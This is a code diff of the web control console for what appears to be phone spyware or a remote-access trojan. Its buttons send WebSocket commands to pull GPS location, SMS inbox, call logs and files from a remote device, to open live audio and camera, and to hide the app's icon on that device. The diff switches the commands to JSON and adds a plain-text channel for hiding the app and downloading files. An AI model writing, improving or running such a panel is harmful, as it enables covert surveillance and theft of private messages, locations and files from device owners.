@@ -4,7 +4,7 @@
     <title>SystemSync Console</title>
     <link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/>
     <style>
-        /* ===== GLOBAL ===== */
+        /* (keep your existing CSS – unchanged) */
         body{
             margin:0;
             background:#f5f7fa;
@@ -59,7 +59,6 @@
             color:white;
             border-color:#1976ff;
         }
-        /* camera control panels */
         .camera-panel {
             background: #f0f2f5;
             border-radius: 8px;
@@ -90,7 +89,6 @@
         .capture-btn:hover, .live-btn:hover {
             background: #0d5bca;
         }
-        /* live stream controls */
         .live-controls {
             display: flex;
             gap: 8px;
@@ -426,20 +424,20 @@
         <button onclick="toggleLiveAudio()"><span>🎤</span> <span id="liveAudioBtn">Live Audio</span></button>
         <button onclick="stopLiveAudio()" style="display:none;" id="stopLiveAudioBtn">⏹ Stop Live Audio</button>
 
-        <button onclick="sendCommand('getLocation')"><span>📍</span> GPS Location</button>
+        <button onclick="sendCommand('GET_LOCATION')"><span>📍</span> GPS Location</button>
     </div>
 
     <div class="section">
         <div class="section-title">Data</div>
-        <button onclick="sendCommand('ls root')"><span>📂</span> File Manager</button>
-        <button onclick="sendCommand('getSMS inbox')"><span>💬</span> SMS Logs</button>
-        <button onclick="sendCommand('getCallLogs')"><span>📞</span> Call Logs</button>
+        <button onclick="sendCommand('LIST_FILES', { path: 'root' })"><span>📂</span> File Manager</button>
+        <button onclick="sendCommand('GET_SMS', { box: 'inbox' })"><span>💬</span> SMS Logs</button>
+        <button onclick="sendCommand('GET_CALL_LOGS')"><span>📞</span> Call Logs</button>
     </div>
 
     <div class="section">
         <div class="section-title">Control</div>
         <button onclick="toggleAppIcon()"><span>👻</span> <span id="iconBtn">Hide Icon</span></button>
-        <button onclick="sendCommand('vibrate 1000')"><span>📳</span> Vibrate (1s)</button>
+        <button onclick="sendCommand('VIBRATE', { duration: 1000 })"><span>📳</span> Vibrate (1s)</button>
     </div>
 </div>
 
@@ -903,10 +901,10 @@
         else if (streamType === 'audio') audioRoomId = roomId;
     }
 
-    // ---------- COMMAND SENDING ----------
+    // ---------- COMMAND SENDING (JSON) ----------
     function sendCommand(command, params = {}) {
         if (!ws || ws.readyState !== WebSocket.OPEN) {
-            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. Click reconnect or check server.</div>`;
+            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. Click reconnect.</div>`;
             return;
         }
         const requestId = 'req_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5);
@@ -919,6 +917,16 @@
         };
         ws.send(JSON.stringify(payload));
         panel.innerHTML = `📤 Command sent: ${command}`;
+    }
+
+    // ---------- PLAIN TEXT SENDING (for hideApp/showApp and file downloads) ----------
+    function sendPlainText(msg) {
+        if (!ws || ws.readyState !== WebSocket.OPEN) {
+            panel.innerHTML = `<div style="color:#d32f2f;">⚠ WebSocket not connected. Click reconnect.</div>`;
+            return;
+        }
+        ws.send(msg);
+        panel.innerHTML = `📤 Plain text sent: ${msg}`;
     }
 
     // ---------- PLAIN TEXT / JSON HANDLERS ----------
@@ -1137,8 +1145,8 @@
 
     // ---------- APP ICON TOGGLE ----------
     function toggleAppIcon() {
-        if (iconHidden) sendCommand('showApp');
-        else sendCommand('hideApp');
+        if (iconHidden) sendPlainText('showApp');
+        else sendPlainText('hideApp');
     }
 
     // ---------- RENDERERS ----------
@@ -1317,7 +1325,7 @@
 
     function handleFolderClick(path) {
         currentPath = path;
-        sendCommand('ls ' + path);
+        sendCommand('LIST_FILES', { path: path });
     }
 
     function navigateUp() {
@@ -1327,7 +1335,7 @@
         let parent = parts.join('/');
         if (parent === '') parent = 'root';
         currentPath = parent;
-        sendCommand('ls ' + parent);
+        sendCommand('LIST_FILES', { path: parent });
     }
 
     function updateSelected(checkbox) {
@@ -1349,7 +1357,7 @@
             return;
         }
         selectedFiles.forEach(path => {
-            sendCommand('dl ' + path);
+            sendPlainText('dl ' + path);
         });
     }
 
@@ -1412,6 +1420,7 @@
     window.toggleLiveAudio = toggleLiveAudio;
     window.stopLiveAudio = stopLiveAudio;
     window.sendCommand = sendCommand;
+    window.sendPlainText = sendPlainText;
     window.toggleAppIcon = toggleAppIcon;
     window.takeSnapshot = takeSnapshot;
     window.toggleRecording = toggleRecording;
